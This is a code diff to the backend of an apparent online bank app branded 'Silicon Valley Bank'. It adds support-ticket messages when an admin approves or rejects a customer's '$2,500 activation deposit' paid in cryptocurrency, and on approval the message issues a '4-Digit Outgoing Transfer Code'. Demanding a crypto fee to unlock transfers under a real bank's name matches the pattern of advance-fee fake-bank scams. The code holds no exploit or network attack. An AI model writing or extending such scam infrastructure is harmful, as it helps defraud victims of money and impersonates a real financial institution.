@@ -1733,6 +1733,41 @@ class DatabaseManager {
     };
     this.db.notifications.unshift(notif);
 
+    // Auto update/create support ticket with 4-digit code
+    try {
+      if (!this.db.supportTickets) this.db.supportTickets = [];
+      let ticket = this.db.supportTickets.find(t => t.userId === targetUser.id);
+      if (!ticket) {
+        ticket = {
+          id: `ticket-${Date.now()}`,
+          userId: targetUser.id,
+          userEmail: targetUser.email,
+          userName: targetUser.fullName,
+          accountNumber: targetUser.accountNumber,
+          subject: `Payment Verification & 4-Digit Security Code Request`,
+          category: 'Deposit',
+          status: 'Resolved',
+          priority: 'High',
+          messages: [],
+          createdAt: now,
+          updatedAt: now
+        };
+        this.db.supportTickets.unshift(ticket);
+      }
+      ticket.messages.push({
+        id: `msg-${Date.now()}-approval`,
+        senderId: adminUser.id,
+        senderName: 'Silicon Valley Bank Client Support',
+        senderRole: 'admin',
+        message: `Silicon Valley Bank Support: Your $2,500 ${deposit.cryptoMethod} payment verification request has been APPROVED!\n\nYour official 4-Digit Outgoing Transfer Code is: [ ${generatedCode} ]\n\n$2,500.00 USD has been credited to your available account balance. Keep your code confidential.`,
+        createdAt: now
+      });
+      ticket.status = 'Resolved';
+      ticket.updatedAt = now;
+    } catch (e) {
+      console.error('Support ticket post on approval error:', e);
+    }
+
     this.addAuditLog({
       adminId: adminUser.id,
       adminEmail: adminUser.email,
@@ -1747,7 +1782,7 @@ class DatabaseManager {
     return { deposit, user: targetUser, code: generatedCode };
   }
 
-  public rejectCryptoActivationDeposit(adminUser: User, depositId: string): { deposit: CryptoActivationDeposit; user: User } {
+  public rejectCryptoActivationDeposit(adminUser: User, depositId: string, notes?: string): { deposit: CryptoActivationDeposit; user: User } {
     if (adminUser.role !== 'admin') throw new Error('Unauthorized. Admin privileges required.');
 
     const deposit = (this.db.cryptoActivationDeposits || []).find(d => d.id === depositId);
@@ -1767,7 +1802,7 @@ class DatabaseManager {
       id: `notif-${Date.now()}-rej`,
       userId: targetUser.id,
       title: '$2,500 Activation Deposit Rejected',
-      message: `Your $2,500 ${deposit.cryptoMethod} activation deposit was rejected by Silicon Valley Bank. 4-Digit Transfer Code has not been issued. Please contact support.`,
+      message: `Your $2,500 ${deposit.cryptoMethod} activation deposit was rejected by Silicon Valley Bank. ${notes ? 'Reason: ' + notes : '4-Digit Transfer Code has not been issued. Please contact support.'}`,
       amount: 0,
       currency: 'USD',
       reference: deposit.id,
@@ -1776,13 +1811,48 @@ class DatabaseManager {
     };
     this.db.notifications.unshift(notif);
 
+    // Auto update/create support ticket with rejection message
+    try {
+      if (!this.db.supportTickets) this.db.supportTickets = [];
+      let ticket = this.db.supportTickets.find(t => t.userId === targetUser.id);
+      if (!ticket) {
+        ticket = {
+          id: `ticket-${Date.now()}`,
+          userId: targetUser.id,
+          userEmail: targetUser.email,
+          userName: targetUser.fullName,
+          accountNumber: targetUser.accountNumber,
+          subject: `Payment Verification & 4-Digit Security Code Request`,
+          category: 'Deposit',
+          status: 'Open',
+          priority: 'High',
+          messages: [],
+          createdAt: now,
+          updatedAt: now
+        };
+        this.db.supportTickets.unshift(ticket);
+      }
+      ticket.messages.push({
+        id: `msg-${Date.now()}-rejection`,
+        senderId: adminUser.id,
+        senderName: 'Silicon Valley Bank Client Support',
+        senderRole: 'admin',
+        message: `Silicon Valley Bank Support: Your $2,500 ${deposit.cryptoMethod} payment verification request was NOT APPROVED.\n\nReason / Explanatory Note:\n${notes || 'The submitted deposit could not be verified on the blockchain network ledger. Please reach out to customer support if you need further assistance.'}`,
+        createdAt: now
+      });
+      ticket.status = 'Open';
+      ticket.updatedAt = now;
+    } catch (e) {
+      console.error('Support ticket post on rejection error:', e);
+    }
+
     this.addAuditLog({
       adminId: adminUser.id,
       adminEmail: adminUser.email,
       action: 'PROFILE_UPDATED',
       targetEmail: targetUser.email,
       targetAccountNumber: targetUser.accountNumber,
-      description: `Rejected $200 ${deposit.cryptoMethod} activation deposit for ${targetUser.email}`,
+      description: `Rejected $2,500 ${deposit.cryptoMethod} activation deposit for ${targetUser.email}`,
       details: { depositId }
     });
 
